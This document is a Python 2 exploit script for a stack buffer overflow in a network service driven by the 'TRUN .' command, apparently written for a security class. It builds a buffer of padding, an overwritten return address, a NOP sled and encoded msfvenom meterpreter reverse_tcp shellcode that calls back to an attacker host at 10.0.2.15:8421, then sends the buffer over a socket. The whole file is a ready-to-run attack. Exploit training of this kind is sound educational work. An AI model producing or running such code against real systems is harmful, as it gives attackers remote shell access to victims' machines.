import socket
import sys


try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
except:
	print "  USAGE: python exploit.py <IP> <PORT>"
	print "EXAMPLE: python exploit.py 192.168.1.1 9999"
	print "Make sure you have a multi/handler listening in msfconsole"
	exit()

garbage = "A" * 2006		#Found length 2006 using fuzzer
eip = "\xAF\x11\x50\x62" 	#Found using Immunity
nop_sled = "\x90" * 24		#24 no-ops for padding, to make sure redirection occurs

#Generated with: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8421 -b \x00 -e x86/shikata_ga_nai -f python
buf =  ""
buf += "\xbd\x48\x9f\x95\xbc\xd9\xc5\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x54\x83\xee\xfc\x31\x6e\x0f\x03\x6e\x47\x7d"
buf += "\x60\x40\xbf\x03\x8b\xb9\x3f\x64\x05\x5c\x0e\xa4\x71"
buf += "\x14\x20\x14\xf1\x78\xcc\xdf\x57\x69\x47\xad\x7f\x9e"
buf += "\xe0\x18\xa6\x91\xf1\x31\x9a\xb0\x71\x48\xcf\x12\x48"
buf += "\x83\x02\x52\x8d\xfe\xef\x06\x46\x74\x5d\xb7\xe3\xc0"
buf += "\x5e\x3c\xbf\xc5\xe6\xa1\x77\xe7\xc7\x77\x0c\xbe\xc7"
buf += "\x76\xc1\xca\x41\x61\x06\xf6\x18\x1a\xfc\x8c\x9a\xca"
buf += "\xcd\x6d\x30\x33\xe2\x9f\x48\x73\xc4\x7f\x3f\x8d\x37"
buf += "\xfd\x38\x4a\x4a\xd9\xcd\x49\xec\xaa\x76\xb6\x0d\x7e"
buf += "\xe0\x3d\x01\xcb\x66\x19\x05\xca\xab\x11\x31\x47\x4a"
buf += "\xf6\xb0\x13\x69\xd2\x99\xc0\x10\x43\x47\xa6\x2d\x93"
buf += "\x28\x17\x88\xdf\xc4\x4c\xa1\xbd\x80\xa1\x88\x3d\x50"
buf += "\xae\x9b\x4e\x62\x71\x30\xd9\xce\xfa\x9e\x1e\x31\xd1"
buf += "\x67\xb0\xcc\xda\x97\x98\x0a\x8e\xc7\xb2\xbb\xaf\x83"
buf += "\x42\x44\x7a\x39\x46\xd2\x8f\xbe\x4a\x2d\xf8\xbc\x4a"
buf += "\x11\x1d\x49\xac\x01\x8d\x1a\x61\xe1\x7d\xdb\xd1\x89"
buf += "\x97\xd4\x0e\xa9\x97\x3e\x27\x43\x78\x97\x1f\xfb\xe1"
buf += "\xb2\xd4\x9a\xee\x68\x91\x9c\x65\x99\x65\x52\x8e\xe8"
buf += "\x75\x82\xef\x12\x86\x52\x9a\x12\xec\x56\x0c\x44\x98"
buf += "\x54\x69\xa2\x07\xa7\x5c\xb0\x40\x57\x21\x81\x3b\x61"
buf += "\xb7\xad\x53\x8d\x57\x2e\xa4\xdb\x3d\x2e\xcc\xbb\x65"
buf += "\x7d\xe9\xc4\xb3\x11\xa2\x50\x3c\x40\x16\xf3\x54\x6e"
buf += "\x41\x33\xfb\x91\xa4\x40\xfc\x6e\x3a\x64\xa5\x06\xc4"
buf += "\x28\x55\xd7\xae\xa8\x05\xbf\x25\x87\xaa\x0f\xc5\x02"
buf += "\xe3\x07\x4c\xc2\x41\xb9\x51\xcf\x04\x67\x51\xe3\x9c"
buf += "\x7e\xdc\x04\x23\x7f\x1e\x39\xf5\x46\x54\x7a\xc5\xfc"
buf += "\x67\x31\x68\x54\xe2\x39\x3e\xa6\x27"

#Note: During class, we found a crash w/ length 3000
#In some cases, you may want to preserve that string size					
tail = "A" * (3000-len(garbage)-len(eip)-len(nop_sled)-len(buf))

#Build the malicious string
badbuf = garbage + eip + nop_sled + buf + tail + "\r\n"


#Connect and send over the trun command, followed by the malicious string

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(("TRUN ." + badbuf))
s.close()
